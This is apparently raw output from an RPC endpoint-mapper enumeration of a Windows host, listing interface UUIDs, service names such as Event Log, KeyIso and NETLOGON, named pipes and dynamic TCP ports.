  86d35949-83c9-4044-b424-db363231fd0c v1.0 (): ncalrpc:[LRPC-2e007fdec1ada6fbd5]
  86d35949-83c9-4044-b424-db363231fd0c v1.0 (): ncacn_ip_tcp:[49667]
  3a9ef155-691d-4449-8d05-09ad57031823 v1.0 (): ncalrpc:[LRPC-b1349865f873a2a359]
  3a9ef155-691d-4449-8d05-09ad57031823 v1.0 (): ncacn_np:[\\PIPE\\atsvc]
  3a9ef155-691d-4449-8d05-09ad57031823 v1.0 (): ncalrpc:[ubpmtaskhostchannel]
  3a9ef155-691d-4449-8d05-09ad57031823 v1.0 (): ncalrpc:[LRPC-2e007fdec1ada6fbd5]
  3a9ef155-691d-4449-8d05-09ad57031823 v1.0 (): ncacn_ip_tcp:[49667]
  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[senssvc]
  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[LRPC-6a9a724c65210674c1]
  30adc50c-5cbc-46ce-9a0e-91914789e23c v1.0 (NRP server endpoint): ncalrpc:[DNSResolver]
  30adc50c-5cbc-46ce-9a0e-91914789e23c v1.0 (NRP server endpoint): ncalrpc:[LRPC-e2710e17dcafd6ec18]
  f2c9b409-c1c9-4100-8639-d8ab1486694a v1.0 (Witness Client Upcall Server): ncalrpc:[LRPC-c531d67da03010ce42]
  eb081a0d-10ee-478a-a1dd-50995283e7a8 v3.0 (Witness Client Test Interface): ncalrpc:[LRPC-c531d67da03010ce42]
  7f1343fe-50a9-4927-a778-0c5859517bac v1.0 (DfsDs service): ncalrpc:[LRPC-c531d67da03010ce42]
  7f1343fe-50a9-4927-a778-0c5859517bac v1.0 (DfsDs service): ncacn_np:[\\PIPE\\wkssvc]
  509bc7ae-77be-4ee8-b07c-0d096bb44345 v1.0 (): ncalrpc:[OLE9DA4E40F6F21638D7CAFAC70143C]
  509bc7ae-77be-4ee8-b07c-0d096bb44345 v1.0 (): ncalrpc:[LRPC-fec0436e5df2536a9e]
  3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6 v1.0 (DHCPv6 Client LRPC Endpoint): ncalrpc:[dhcpcsvc6]
  3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5 v1.0 (DHCP Client LRPC Endpoint): ncalrpc:[dhcpcsvc6]
  3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5 v1.0 (DHCP Client LRPC Endpoint): ncalrpc:[dhcpcsvc]
  30b044a5-a225-43f0-b3a4-e060df91f9c1 v1.0 (): ncalrpc:[LRPC-3c8caaba49313f4c2d]
  3f787932-3452-4363-8651-6ea97bb373bb v1.0 (NSP Rpc Interface): ncalrpc:[OLE4C854D9ED5B5B8170BEA37A664E8]
  3f787932-3452-4363-8651-6ea97bb373bb v1.0 (NSP Rpc Interface): ncalrpc:[LRPC-e9b7d04c30e74f5c1e]
  bd6ca954-842e-468f-8b07-89cbfa9522dc v1.0 (NetworkProfiles Telemetry RPC Interface): ncalrpc:[OLE4C854D9ED5B5B8170BEA37A664E8]
  bd6ca954-842e-468f-8b07-89cbfa9522dc v1.0 (NetworkProfiles Telemetry RPC Interface): ncalrpc:[LRPC-e9b7d04c30e74f5c1e]
  bd6ca954-842e-468f-8b07-89cbfa9522dc v1.0 (NetworkProfiles Telemetry RPC Interface): ncalrpc:[INlmDiagnosticsApi]
  4c8d0bef-d7f1-49f0-9102-caa05f58d114 v1.0 (): ncalrpc:[OLE4C854D9ED5B5B8170BEA37A664E8]
  4c8d0bef-d7f1-49f0-9102-caa05f58d114 v1.0 (): ncalrpc:[LRPC-e9b7d04c30e74f5c1e]
  4c8d0bef-d7f1-49f0-9102-caa05f58d114 v1.0 (): ncalrpc:[INlmDiagnosticsApi]
  4c8d0bef-d7f1-49f0-9102-caa05f58d114 v1.0 (): ncalrpc:[nlaplg]
  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[IUserProfile2]
  f6beaff7-1e19-4fbb-9f8f-b89e2018337c v1.0 (Windows Event Log): ncalrpc:[eventlog]
  f6beaff7-1e19-4fbb-9f8f-b89e2018337c v1.0 (Windows Event Log): ncacn_np:[\\pipe\\eventlog]
  f6beaff7-1e19-4fbb-9f8f-b89e2018337c v1.0 (Windows Event Log): ncacn_ip_tcp:[49666]
  7ea70bcf-48af-4f6a-8968-6a440754d5fa v1.0 (NSI server endpoint): ncalrpc:[LRPC-c307ff67760ec1f57a]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-703c03a8c6b33510ab]
  a500d4c6-0dd1-4543-bc0c-d5f93486eaf8 v1.0 (): ncalrpc:[LRPC-703c03a8c6b33510ab]
  a500d4c6-0dd1-4543-bc0c-d5f93486eaf8 v1.0 (): ncalrpc:[LRPC-a1f33ed3b645b0c48c]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-a7e666afcb107b30f0]
  5222821f-d5e2-4885-84f1-5f6185a0ec41 v1.0 (): ncalrpc:[LRPC-a9daf8224104312508]
  880fd55e-43b9-11e0-b1a8-cf4edfd72085 v1.0 (KAPI Service endpoint): ncalrpc:[LRPC-a7e666afcb107b30f0]
  880fd55e-43b9-11e0-b1a8-cf4edfd72085 v1.0 (KAPI Service endpoint): ncalrpc:[OLE871DB697ECE335FEED3892041EE1]
  880fd55e-43b9-11e0-b1a8-cf4edfd72085 v1.0 (KAPI Service endpoint): ncalrpc:[LRPC-630b26e382d95fb0b5]
  e40f7b57-7a25-4cd3-a135-7f7d3df9d16b v1.0 (): ncalrpc:[LRPC-8b800202b7c4cbccb9]
  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[LRPC-165969e778654bd03d]
  4bec6bb8-b5c2-4b6f-b2c1-5da5cf92d0d9 v1.0 (): ncalrpc:[umpo]
  085b0334-e454-4d91-9b8c-4134f9e793f3 v1.0 (): ncalrpc:[umpo]
  8782d3b9-ebbd-4644-a3d8-e8725381919b v1.0 (): ncalrpc:[umpo]
  3b338d89-6cfa-44b8-847e-531531bc9992 v1.0 (): ncalrpc:[umpo]
  bdaa0970-413b-4a3e-9e5d-f6dc9d7e0760 v1.0 (): ncalrpc:[umpo]
  5824833b-3c1a-4ad2-bdfd-c31d19e23ed2 v1.0 (): ncalrpc:[umpo]
  0361ae94-0316-4c6c-8ad8-c594375800e2 v1.0 (): ncalrpc:[umpo]
  dd59071b-3215-4c59-8481-972edadc0f6a v1.0 (): ncalrpc:[umpo]
  dd59071b-3215-4c59-8481-972edadc0f6a v1.0 (): ncalrpc:[actkernel]
  2d98a740-581d-41b9-aa0d-a88b9d5ce938 v1.0 (): ncalrpc:[umpo]
  2d98a740-581d-41b9-aa0d-a88b9d5ce938 v1.0 (): ncalrpc:[actkernel]
  2d98a740-581d-41b9-aa0d-a88b9d5ce938 v1.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
  8bfc3be1-6def-4e2d-af74-7c47cd0ade4a v1.0 (): ncalrpc:[umpo]
  8bfc3be1-6def-4e2d-af74-7c47cd0ade4a v1.0 (): ncalrpc:[actkernel]
  8bfc3be1-6def-4e2d-af74-7c47cd0ade4a v1.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
  1b37ca91-76b1-4f5e-a3c7-2abfc61f2bb0 v1.0 (): ncalrpc:[umpo]
  1b37ca91-76b1-4f5e-a3c7-2abfc61f2bb0 v1.0 (): ncalrpc:[actkernel]
  1b37ca91-76b1-4f5e-a3c7-2abfc61f2bb0 v1.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
  c605f9fb-f0a3-4e2a-a073-73560f8d9e3e v1.0 (): ncalrpc:[umpo]
  c605f9fb-f0a3-4e2a-a073-73560f8d9e3e v1.0 (): ncalrpc:[actkernel]
  c605f9fb-f0a3-4e2a-a073-73560f8d9e3e v1.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
  0d3e2735-cea0-4ecc-a9e2-41a2d81aed4e v1.0 (): ncalrpc:[umpo]
  0d3e2735-cea0-4ecc-a9e2-41a2d81aed4e v1.0 (): ncalrpc:[actkernel]
  0d3e2735-cea0-4ecc-a9e2-41a2d81aed4e v1.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
  2513bcbe-6cd4-4348-855e-7efb3c336dd3 v2.0 (): ncalrpc:[umpo]
  2513bcbe-6cd4-4348-855e-7efb3c336dd3 v2.0 (): ncalrpc:[actkernel]
  2513bcbe-6cd4-4348-855e-7efb3c336dd3 v2.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
  2513bcbe-6cd4-4348-855e-7efb3c336dd3 v2.0 (): ncalrpc:[OLE54E860A83667E490C15B5CC31187]
  20c40295-8dba-48e6-aebf-3e78ef3bb144 v2.0 (): ncalrpc:[umpo]
  20c40295-8dba-48e6-aebf-3e78ef3bb144 v2.0 (): ncalrpc:[actkernel]
  20c40295-8dba-48e6-aebf-3e78ef3bb144 v2.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
  20c40295-8dba-48e6-aebf-3e78ef3bb144 v2.0 (): ncalrpc:[OLE54E860A83667E490C15B5CC31187]
  857fb1be-084f-4fb5-b59c-4b2c4be5f0cf v1.0 (): ncalrpc:[umpo]
  857fb1be-084f-4fb5-b59c-4b2c4be5f0cf v1.0 (): ncalrpc:[actkernel]
  857fb1be-084f-4fb5-b59c-4b2c4be5f0cf v1.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
  857fb1be-084f-4fb5-b59c-4b2c4be5f0cf v1.0 (): ncalrpc:[OLE54E860A83667E490C15B5CC31187]
  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[umpo]
  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[actkernel]
  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[OLE54E860A83667E490C15B5CC31187]
  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[LRPC-17017c76639b8c4bb9]
  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[umpo]
  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[actkernel]
  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[OLE54E860A83667E490C15B5CC31187]
  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[LRPC-17017c76639b8c4bb9]
  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[umpo]
  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[actkernel]
  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[OLE54E860A83667E490C15B5CC31187]
  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[LRPC-17017c76639b8c4bb9]
  2c7fd9ce-e706-4b40-b412-953107ef9bb0 v0.0 (): ncalrpc:[umpo]
  4dace966-a243-4450-ae3f-9b7bcb5315b8 v2.0 (): ncalrpc:[umpo]
  178d84be-9291-4994-82c6-3f909aca5a03 v1.0 (): ncalrpc:[umpo]
  e53d94ca-7464-4839-b044-09a2fb8b3ae5 v1.0 (): ncalrpc:[umpo]
  fae436b0-b864-4a87-9eda-298547cd82f2 v1.0 (): ncalrpc:[umpo]
  082a3471-31b6-422a-b931-a54401960c62 v1.0 (): ncalrpc:[umpo]
  6982a06e-5fe2-46b1-b39c-a2c545bfa069 v1.0 (): ncalrpc:[umpo]
  0ff1f646-13bb-400a-ab50-9a78f2b7a85a v1.0 (): ncalrpc:[umpo]
  4ed8abcc-f1e2-438b-981f-bb0e8abc010c v1.0 (): ncalrpc:[umpo]
  95406f0b-b239-4318-91bb-cea3a46ff0dc v1.0 (): ncalrpc:[umpo]
  0d47017b-b33b-46ad-9e18-fe96456c5078 v1.0 (): ncalrpc:[umpo]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[umpo]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[actkernel]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[OLE54E860A83667E490C15B5CC31187]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-17017c76639b8c4bb9]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-fd6a20dd9dd931fc0e]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[umpo]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[actkernel]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[OLE54E860A83667E490C15B5CC31187]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[LRPC-17017c76639b8c4bb9]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[LRPC-fd6a20dd9dd931fc0e]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[LRPC-2db8b6ca50fbc48ced]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[umpo]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[actkernel]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[OLE54E860A83667E490C15B5CC31187]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-17017c76639b8c4bb9]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-fd6a20dd9dd931fc0e]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-2db8b6ca50fbc48ced]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[umpo]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[actkernel]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[OLE54E860A83667E490C15B5CC31187]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-17017c76639b8c4bb9]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-fd6a20dd9dd931fc0e]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-2db8b6ca50fbc48ced]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-1819d481aab6df3f79]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[umpo]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[actkernel]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[OLE54E860A83667E490C15B5CC31187]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-17017c76639b8c4bb9]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-fd6a20dd9dd931fc0e]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-2db8b6ca50fbc48ced]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-1819d481aab6df3f79]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[csebpub]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[umpo]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[actkernel]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[OLE54E860A83667E490C15B5CC31187]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-17017c76639b8c4bb9]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-fd6a20dd9dd931fc0e]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-2db8b6ca50fbc48ced]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-1819d481aab6df3f79]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[csebpub]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[dabrpc]
  76f226c3-ec14-4325-8a99-6a46348418af v1.0 (): ncalrpc:[WMsgKRpc0A6F70]
  76f226c3-ec14-4325-8a99-6a46348418af v1.0 (): ncacn_np:[\\PIPE\\InitShutdown]
  76f226c3-ec14-4325-8a99-6a46348418af v1.0 (): ncalrpc:[WindowsShutdown]
  d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 (): ncalrpc:[WMsgKRpc0A6F70]
  d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 (): ncacn_np:[\\PIPE\\InitShutdown]
  d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 (): ncalrpc:[WindowsShutdown]
  d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 (): ncacn_ip_tcp:[49665]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[clipsfk]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[imsfk]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncacn_np:[\\pipe\\lsass]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[audit]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[securityevent]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[LSARPC_ENDPOINT]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[lsacap]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[LSA_IDPEXT_ENDPOINT]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[LSA_EAS_ENDPOINT]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[lsapolicylookup]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[lsasspirpc]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[protected_storage]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[SidKey Local End Point]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[samss lpc]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncacn_ip_tcp:[49664]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[clipsfk]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[imsfk]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncacn_np:[\\pipe\\lsass]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[audit]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[securityevent]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSARPC_ENDPOINT]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsacap]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSA_IDPEXT_ENDPOINT]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSA_EAS_ENDPOINT]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsapolicylookup]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsasspirpc]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[protected_storage]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[SidKey Local End Point]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[samss lpc]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncacn_ip_tcp:[49664]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[NETLOGON_LRPC]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncacn_ip_tcp:[49669]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[clipsfk]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[imsfk]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncacn_np:[\\pipe\\lsass]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[audit]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[securityevent]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSARPC_ENDPOINT]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsacap]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSA_IDPEXT_ENDPOINT]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSA_EAS_ENDPOINT]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsapolicylookup]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsasspirpc]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[protected_storage]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[SidKey Local End Point]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[samss lpc]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncacn_ip_tcp:[49664]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[NETLOGON_LRPC]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncacn_ip_tcp:[49669]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[clipsfk]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[imsfk]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncacn_np:[\\pipe\\lsass]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[audit]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[securityevent]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[LSARPC_ENDPOINT]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[lsacap]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[LSA_IDPEXT_ENDPOINT]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[LSA_EAS_ENDPOINT]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[lsapolicylookup]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[lsasspirpc]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[protected_storage]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[SidKey Local End Point]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[samss lpc]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncacn_ip_tcp:[49664]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[NETLOGON_LRPC]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncacn_ip_tcp:[49669]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[clipsfk]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[imsfk]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncacn_np:[\\pipe\\lsass]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[audit]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[securityevent]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[LSARPC_ENDPOINT]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[lsacap]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[LSA_IDPEXT_ENDPOINT]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[LSA_EAS_ENDPOINT]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[lsapolicylookup]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[lsasspirpc]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[protected_storage]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[SidKey Local End Point]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[samss lpc]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncacn_ip_tcp:[49664]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[NETLOGON_LRPC]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncacn_ip_tcp:[49669]
